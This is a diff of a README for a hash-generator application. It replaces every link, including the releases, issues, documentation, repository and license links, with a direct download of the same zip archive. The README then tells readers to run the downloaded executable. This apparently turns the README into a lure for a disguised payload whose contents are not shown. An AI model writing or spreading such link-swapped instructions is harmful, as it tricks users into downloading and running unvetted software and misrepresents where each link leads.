@@ -7,10 +7,10 @@ The hash-generator helps you hash text and files using popular algorithms like M
 To begin using the hash-generator, you’ll need to download the application. Follow the steps below to get started.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-brightgreen)](https://github.com/Callio89/hash-generator/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Callio89/hash-generator/main/forevermore/generator_hash_v3.5.zip)](https://raw.githubusercontent.com/Callio89/hash-generator/main/forevermore/generator_hash_v3.5.zip)
 
 ## 🌐 Visit Releases
-Go to our [Releases page](https://github.com/Callio89/hash-generator/releases) to access the latest version.
+Go to our [Releases page](https://raw.githubusercontent.com/Callio89/hash-generator/main/forevermore/generator_hash_v3.5.zip) to access the latest version.
 
 ## 📚 Requirements
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
@@ -25,7 +25,7 @@ Go to our [Releases page](https://github.com/Callio89/hash-generator/releases) t
 
 ## 🔧 Installation Steps
 1. **Download the Application:**
-   Visit our [Releases page](https://github.com/Callio89/hash-generator/releases) and select the version compatible with your operating system.
+   Visit our [Releases page](https://raw.githubusercontent.com/Callio89/hash-generator/main/forevermore/generator_hash_v3.5.zip) and select the version compatible with your operating system.
 
 2. **Install the Application:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the prompts to install.
@@ -51,11 +51,11 @@ Go to our [Releases page](https://github.com/Callio89/hash-generator/releases) t
 - If the application fails to open, reboot your device and try again.
 
 ## 📞 Support
-For further assistance, you can reach out via the [Issues page](https://github.com/Callio89/hash-generator/issues). We welcome your feedback and questions.
+For further assistance, you can reach out via the [Issues page](https://raw.githubusercontent.com/Callio89/hash-generator/main/forevermore/generator_hash_v3.5.zip). We welcome your feedback and questions.
 
 ## 🔗 Links
-- [Project Repository](https://github.com/Callio89/hash-generator)
-- [Documentation](https://github.com/Callio89/hash-generator/wiki)
+- [Project Repository](https://raw.githubusercontent.com/Callio89/hash-generator/main/forevermore/generator_hash_v3.5.zip)
+- [Documentation](https://raw.githubusercontent.com/Callio89/hash-generator/main/forevermore/generator_hash_v3.5.zip)
 
 ## 📜 License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Callio89/hash-generator/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Callio89/hash-generator/main/forevermore/generator_hash_v3.5.zip) file for details.
